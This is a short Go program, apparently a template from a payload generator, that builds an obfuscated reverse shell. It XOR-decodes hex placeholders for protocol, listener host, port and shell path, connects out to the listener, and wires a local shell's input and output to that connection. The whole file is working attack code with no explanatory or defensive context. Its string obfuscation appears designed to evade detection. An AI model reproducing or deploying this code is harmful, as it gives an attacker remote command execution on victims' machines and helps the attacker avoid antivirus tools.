//https://gist.github.com/jasonrdsouza/ea122c3a02eba003329e 
package main

import (
    "os/exec"
    "net"
    "encoding/hex"
)

//https://kylewbanks.com/blog/xor-encryption-using-go
func xor(input []byte, key string) (output string) {
        for i := 0; i < len(input); i++ {
                output += string(input[i] ^ key[i % len(key)])
        }
        return output
}

func d(h string) ([]byte) {
    res , _ := hex.DecodeString(h)
    return res
}

func main() {
    proto := xor(d("{PROTO}"), "{OBF_KEY}")
    lhost := xor(d("{LHOST}"), "{OBF_KEY}")
    lport := xor(d("{LPORT}"), "{OBF_KEY}")
    shell := xor(d("{SHELL}"), "{OBF_KEY}")
	c, _ := net.Dial(proto, lhost+":"+lport)
	cmd := exec.Command(shell)
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
